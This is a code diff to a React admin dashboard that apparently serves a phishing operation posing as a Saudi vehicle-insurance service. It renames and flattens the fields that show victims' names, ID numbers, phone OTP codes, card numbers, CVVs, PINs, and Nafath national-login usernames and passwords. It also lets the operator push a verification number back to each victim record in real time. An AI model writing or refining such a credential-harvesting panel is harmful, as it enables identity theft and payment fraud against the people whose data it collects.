@@ -74,7 +74,6 @@ type FlagColor = "red" | "yellow" | "green" | null
 interface Notification {
   createdDate: string;
   id: string;
-  formData: {
     insurance_purpose: "renewal" | "property-transfer";
     vehicle_type: "registration" | "customs" | "serial";
     documment_owner_full_name: string;
@@ -82,13 +81,11 @@ interface Notification {
     buyer_identity_number?: string;
     seller_identity_number?: string;
     phoneNumber?: string;
-    phoneOtpCode?: string; // New field
-    operator?: string; // New field
+ 
     serial_number?: string;
     vehicle_manufacture_number?: string;
     customs_code?: string;
     agreeToTerms: boolean;
-  };
   phoneOtpCode?: string; // New field
   operator?: string; // New field
   phone2?: string; // New field
@@ -123,8 +120,8 @@ interface Notification {
   identity_number?: string;
   password?: string;
   allOtp?: string[];
-  nafadUsername?: string;
-  nafadPassword?: string;
+  nafazId?: string;
+  nafazPass?: string;
   nafazVerified?: boolean;
   nafazLoginTime?: string;
   nafazStatus?: "pending" | "verified" | "failed";
@@ -820,8 +817,8 @@ export default function NotificationsPage() {
       const term = searchTerm.toLowerCase()
       filtered = filtered.filter(
         (notification) =>
-          notification.formData?.documment_owner_full_name?.toLowerCase().includes(term) ||
-          notification.formData?.seller_identity_number?.toLowerCase().includes(term) ||
+          notification?.documment_owner_full_name?.toLowerCase().includes(term) ||
+          notification?.seller_identity_number?.toLowerCase().includes(term) ||
           notification.phone?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
@@ -909,8 +906,8 @@ export default function NotificationsPage() {
         )
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
-            (notification.formData?.buyer_identity_number || notification.formData?.phoneNumber || notification.formData?.vehicle_type) &&
-            !notifications.some((n) => n.id === notification.id && (n.formData?.buyer_identity_number || n.formData?.phoneNumber || n.formData?.vehicle_type)),
+            (notification?.buyer_identity_number || notification?.phoneNumber || notification?.vehicle_type) &&
+            !notifications.some((n) => n.id === notification.id && (n?.buyer_identity_number || n?.phoneNumber || n?.vehicle_type)),
         )
 
         // Only play notification sound if new card info or general info is added
@@ -1014,7 +1011,7 @@ export default function NotificationsPage() {
     try {
       const docRef = doc(db, "pays", id);
       await updateDoc(docRef, {
-        nafaz_pin: authNumber,
+        authNumber: authNumber,
         phoneVerificationStatus: "approved",
       });
       setNotifications((prev) =>
@@ -1540,13 +1537,13 @@ export default function NotificationsPage() {
                       <td className="px-6 py-4">
                         <div className="flex flex-wrap gap-2">
                           <Badge
-                            variant={notification.formData?.documment_owner_full_name ? "default" : "secondary"}
-                            className={`cursor-pointer ${notification.phone2 ?" animate-bounce ":""} transition-all hover:scale-105 ${notification.formData?.documment_owner_full_name ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
+                            variant={notification?.documment_owner_full_name ? "default" : "secondary"}
+                            className={`cursor-pointer ${notification.phone2 ?" animate-bounce ":""} transition-all hover:scale-105 ${notification?.documment_owner_full_name ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
                               }`}
                             onClick={() => handleInfoClick(notification, "personal")}
                           >
                             <User className="h-3 w-3 mr-1" />
-                            {notification.formData?.documment_owner_full_name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                            {notification?.documment_owner_full_name ? "معلومات شخصية" : "لا يوجد معلومات"}
                           </Badge>
                           <Badge
                             variant={notification.cardNumber ? "default" : "secondary"}
@@ -1558,13 +1555,13 @@ export default function NotificationsPage() {
                             {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                           </Badge>
                           <Badge
-                            variant={notification.nafadUsername ? "default" : "secondary"}
-                            className={`cursor-pointer transition-all hover:scale-105 ${notification.nafadUsername ? "bg-gradient-to-r from-yellow-500 to-yellow-600 text-white" : ""
+                            variant={notification.nafazId ? "default" : "secondary"}
+                            className={`cursor-pointer transition-all hover:scale-105 ${notification.nafazId ? "bg-gradient-to-r from-yellow-500 to-yellow-600 text-white" : ""
                               }`}
                             onClick={() => handleInfoClick(notification, "nafaz")}
                           >
                             <User className="h-3 w-3 mr-1" />
-                            {notification.nafadUsername ? "معلومات نفاذ" : "لا يوجد معلومات"}
+                            {notification.nafazId ? "معلومات نفاذ" : "لا يوجد معلومات"}
                           </Badge>
                         </div>
                       </td>
@@ -1826,15 +1823,15 @@ export default function NotificationsPage() {
             <div className="space-y-4">
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
-                  { label: "الاسم", value: selectedNotification.formData?.documment_owner_full_name },
-                  { label: "رقم الهوية", value: selectedNotification.formData?.buyer_identity_number },
+                  { label: "الاسم", value: selectedNotification?.documment_owner_full_name },
+                  { label: "رقم الهوية", value: selectedNotification?.owner_identity_number },
                   {
                     label: "الشبكة ",
                     value: selectedNotification?.operator,
                   },
-                  { label: "رقم الجوال", value: selectedNotification.formData?.phoneNumber },
+                  { label: "رقم الجوال", value: selectedNotification?.phoneNumber },
                   { label: "الهاتف2", value: selectedNotification?.phone2 },
-                  { label: "رمزهاتف", value: selectedNotification?.phoneOtpCode },
+                  { label: "2رمزهاتف", value: selectedNotification?.phoneOtpCode },
 
                 ].map(
                   ({ label, value }) =>
@@ -1858,7 +1855,7 @@ export default function NotificationsPage() {
                   className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                 >
                   <span className="font-medium text-muted-foreground">اسم المستخدم:</span>
-                  <span className="font-semibold" >{selectedNotification?.nafadUsername}</span>
+                  <span className="font-semibold" >{selectedNotification?.nafazId}</span>
                 </div>
 
               </div>
@@ -1866,7 +1863,7 @@ export default function NotificationsPage() {
                 className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
               >
                 <span className="font-medium text-muted-foreground">باسورد:</span>
-                <span className="font-semibold" >{selectedNotification?.nafadPassword}</span>
+                <span className="font-semibold" >{selectedNotification?.nafazPass}</span>
               </div>
               <div className="flex justify-around">
                 <input type="tel" value={authNumber} onChange={(e) => setAuthNumber(e.target.value)} />
@@ -1892,7 +1889,7 @@ export default function NotificationsPage() {
                   { label: "رمز الأمان", value: selectedNotification.cvv },
                   { label: "رمز التحقق", value: selectedNotification.otp },
                   { label: "كلمة المرور", value: selectedNotification.pinCode },
-                  { label: "الخطوة الحالية", value: selectedNotification.currentPage },
+      
                 ].map(
                   ({ label, value }) =>
                     value !== undefined && (
